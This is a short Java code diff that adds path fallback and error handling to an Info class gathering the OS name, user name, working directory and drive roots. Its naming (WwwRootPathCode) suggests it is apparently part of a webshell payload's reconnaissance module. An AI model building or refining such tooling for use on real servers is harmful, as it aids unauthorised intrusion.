@@ -68,6 +68,9 @@ public class Info {
             d = new File(cd).getParent();
         }
         d = String.valueOf(d.charAt(0)).toUpperCase() + d.substring(1);
+        if (!d.startsWith("/") && d.charAt(1) != 58) {
+            d = System.getProperty("user.dir");
+        }
         String serverInfo = System.getProperty("os.name");
         String user = System.getProperty("user.name");
         String driverlist = this.WwwRootPathCode(d);
@@ -77,9 +80,13 @@ public class Info {
     String WwwRootPathCode(String d) {
         StringBuilder s = new StringBuilder();
         if (!d.startsWith("/")) {
-            File[] roots = File.listRoots();
-            for (File root : roots) {
-                s.append(root.toString(), 0, 2);
+            try {
+                File[] roots = File.listRoots();
+                for (File root : roots) {
+                    s.append(root.toString(), 0, 2);
+                }
+            } catch (Exception e) {
+                s.append("/");
             }
         } else {
             s.append("/");
